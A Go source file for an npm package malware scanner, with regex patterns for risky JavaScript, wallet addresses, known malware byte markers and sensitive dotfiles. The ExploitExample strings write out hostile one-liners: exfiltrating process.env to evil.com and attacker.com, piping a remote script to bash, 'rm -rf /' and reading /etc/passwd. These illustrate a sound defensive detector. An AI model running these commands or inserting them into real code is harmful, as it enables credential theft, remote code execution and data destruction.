package analyzer

import "regexp"

// maliciousJSPattern defines a pattern to detect in JS/TS source files.
type maliciousJSPattern struct {
	Name           string
	Pattern        *regexp.Regexp
	Severity       Severity
	ExploitExample string
	Remediation    string
}

// maliciousJSPatterns detects suspicious code in JavaScript/TypeScript files.
var maliciousJSPatterns = []maliciousJSPattern{
	{
		Name:           "child_process require",
		Pattern:        regexp.MustCompile(`require\s*\(\s*['"]child_process['"]\s*\)`),
		Severity:       SeverityCritical,
		ExploitExample: "const cp = require('child_process');\ncp.exec('curl http://attacker.com/$(whoami)');",
		Remediation:    "Avoid using child_process. If you must, ensure no user-controlled input is passed to it.",
	},
	{
		Name:           "child_process import",
		Pattern:        regexp.MustCompile(`import\s+.*from\s+['"]child_process['"]`),
		Severity:       SeverityCritical,
		ExploitExample: "import { exec } from 'child_process';\nexec('rm -rf /');",
		Remediation:    "Use higher-level APIs if possible. Ensure all commands are strictly validated.",
	},
	{
		Name:           "exec/spawn call",
		Pattern:        regexp.MustCompile(`\b(exec|execSync|spawn|spawnSync|execFile|execFileSync|fork)\s*\(`),
		Severity:       SeverityHigh,
		ExploitExample: "require('child_process').execSync('id');",
		Remediation:    "Use spawn with argument arrays instead of exec with strings to prevent command injection.",
	},
	{
		Name:           "eval usage",
		Pattern:        regexp.MustCompile(`\beval\s*\(`),
		Severity:       SeverityHigh,
		ExploitExample: "eval('process.exit(1)');",
		Remediation:    "Refactor code to avoid eval(). Use JSON.parse() for JSON data.",
	},
	{
		Name:           "Function constructor",
		Pattern:        regexp.MustCompile(`new\s+Function\s*\(`),
		Severity:       SeverityHigh,
		ExploitExample: "const malicious = new Function('return process.env')();",
		Remediation:    "Avoid dynamic code generation via the Function constructor.",
	},
	{
		Name:           "DNS operations",
		Pattern:        regexp.MustCompile(`require\s*\(\s*['"]dns['"]\s*\)`),
		Severity:       SeverityHigh,
		ExploitExample: "require('dns').lookup('attacker.com', (err, addr) => { ... });",
		Remediation:    "Ensure DNS lookups are necessary and target trusted domains.",
	},
	{
		Name:           "process.env access",
		Pattern:        regexp.MustCompile(`process\.env\b`),
		Severity:       SeverityMedium,
		ExploitExample: "fetch('https://evil.com/leak?env=' + JSON.stringify(process.env));",
		Remediation:    "Limit access to sensitive environment variables. Use a whitelist.",
	},
	{
		Name:           "credential path access",
		Pattern:        regexp.MustCompile(`['"](/etc/passwd|/etc/shadow|\.ssh/|\.npmrc|\.env|\.aws/credentials|\.docker/config|\.kube/config)['"]`),
		Severity:       SeverityCritical,
		ExploitExample: "require('fs').readFileSync('/etc/passwd');",
		Remediation:    "Packages should not access system-level configuration or credentials.",
	},
	{
		Name:           "network request",
		Pattern:        regexp.MustCompile(`require\s*\(\s*['"](http|https|net|dgram|tls)['"]\s*\)`),
		Severity:       SeverityMedium,
		ExploitExample: "require('http').get('http://attacker.com/logger?data=...');",
		Remediation:    "Audit all network requests to ensure they only connect to expected endpoints.",
	},
	{
		Name:           "fetch API",
		Pattern:        regexp.MustCompile(`\bfetch\s*\(\s*['"]https?://`),
		Severity:       SeverityMedium,
		ExploitExample: "fetch('http://attacker.com/collect', { method: 'POST', body: data });",
		Remediation:    "Verify the destination of all fetch calls.",
	},
	{
		Name:           "XMLHttpRequest",
		Pattern:        regexp.MustCompile(`new\s+XMLHttpRequest`),
		Severity:       SeverityMedium,
		ExploitExample: "var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://evil.com'); xhr.send();",
		Remediation:    "Use modern fetch API with strict CSP if possible.",
	},
	{
		Name:           "curl/wget in string",
		Pattern:        regexp.MustCompile(`['"].*\b(curl|wget)\s+`),
		Severity:       SeverityHigh,
		ExploitExample: "const cmd = 'curl http://evil.com/script.sh | bash';\nrequire('child_process').exec(cmd);",
		Remediation:    "Avoid downloading and executing remote scripts.",
	},
	{
		Name:           "base64 decode",
		Pattern:        regexp.MustCompile(`Buffer\.from\s*\([^,]+,\s*['"]base64['"]\)`),
		Severity:       SeverityMedium,
		ExploitExample: "const payload = Buffer.from('cHJvY2Vzcy.exit()', 'base64').toString();\neval(payload);",
		Remediation:    "Decode base64 content only from trusted sources.",
	},
	{
		Name:           "hex decode in buffer",
		Pattern:        regexp.MustCompile(`Buffer\.from\s*\([^,]+,\s*['"]hex['"]\)`),
		Severity:       SeverityMedium,
		ExploitExample: "const payload = Buffer.from('70726f636573732e657869742829', 'hex').toString();\neval(payload);",
		Remediation:    "Avoid using hex encoding to hide code segments.",
	},
	{
		Name:           "environment exfiltration",
		Pattern:        regexp.MustCompile(`JSON\.stringify\s*\(\s*process\.env\s*\)`),
		Severity:       SeverityCritical,
		ExploitExample: "fetch('http://attacker.com/log', { body: JSON.stringify(process.env) });",
		Remediation:    "Never serialize the entire environment as it contains sensitive tokens.",
	},
	{
		Name:           "dynamic require",
		Pattern:        regexp.MustCompile(`require\s*\(\s*[^'"]\S+\s*\+`),
		Severity:       SeverityMedium,
		ExploitExample: "const mod = './internal/' + userType;\nrequire(mod);",
		Remediation:    "Avoid dynamic paths in require() to prevent local file inclusion (LFI).",
	},
}

// cryptoWalletPattern detects cryptocurrency wallet addresses.
type cryptoWalletPattern struct {
	Name    string
	Pattern *regexp.Regexp
}

// cryptoWalletPatterns matches common cryptocurrency address formats.
var cryptoWalletPatterns = []cryptoWalletPattern{
	{
		Name:    "Bitcoin address",
		Pattern: regexp.MustCompile(`\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\b`),
	},
	{
		Name:    "Bitcoin Bech32 address",
		Pattern: regexp.MustCompile(`\bbc1[a-zA-HJ-NP-Z0-9]{25,90}\b`),
	},
	{
		Name:    "Ethereum address",
		Pattern: regexp.MustCompile(`\b0x[0-9a-fA-F]{40}\b`),
	},
	{
		Name:    "Monero address",
		Pattern: regexp.MustCompile(`\b4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}\b`),
	},
}

// knownMalwareSignature holds a byte sequence from known npm malware.
type knownMalwareSignature struct {
	Name      string
	Signature []byte
}

// knownMalwareSignatures are byte sequences found in known npm malware samples.
var knownMalwareSignatures = []knownMalwareSignature{
	{
		Name:      "flatmap-stream payload marker",
		Signature: []byte("e.exports=function(e,t,n)"),
	},
	{
		Name:      "event-stream/flatmap injection",
		Signature: []byte("./test/data"),
	},
	{
		Name:      "ua-parser-js crypto miner marker",
		Signature: []byte("jsextension"),
	},
	{
		Name:      "rc/systeminformation exfil",
		Signature: []byte("sstatic1.histats.com"),
	},
	{
		Name:      "coa malware marker",
		Signature: []byte("sdd.dll"),
	},
}

// binaryMagic detects compiled binary files by their magic bytes.
type binaryMagic struct {
	Name  string
	Magic []byte
}

// binaryMagicBytes are file signatures for compiled executables.
var binaryMagicBytes = []binaryMagic{
	{Name: "ELF binary", Magic: []byte{0x7f, 0x45, 0x4c, 0x46}},
	{Name: "PE executable", Magic: []byte{0x4d, 0x5a}},
	{Name: "Mach-O binary (32-bit)", Magic: []byte{0xfe, 0xed, 0xfa, 0xce}},
	{Name: "Mach-O binary (64-bit)", Magic: []byte{0xfe, 0xed, 0xfa, 0xcf}},
	{Name: "Mach-O binary (universal)", Magic: []byte{0xca, 0xfe, 0xba, 0xbe}},
}

// hiddenFileNames are files that should not normally be in an npm package.
var hiddenFileNames = map[string]bool{
	".env":               true,
	".npmrc":             true,
	".ssh":               true,
	".git":               true,
	".aws":               true,
	".docker":            true,
	".kube":              true,
	".bash_history":      true,
	".zsh_history":       true,
	".netrc":             true,
	".pgpass":            true,
	".mysql_history":     true,
	".psql_history":      true,
	".gitconfig":         true,
	".config":            true,
}
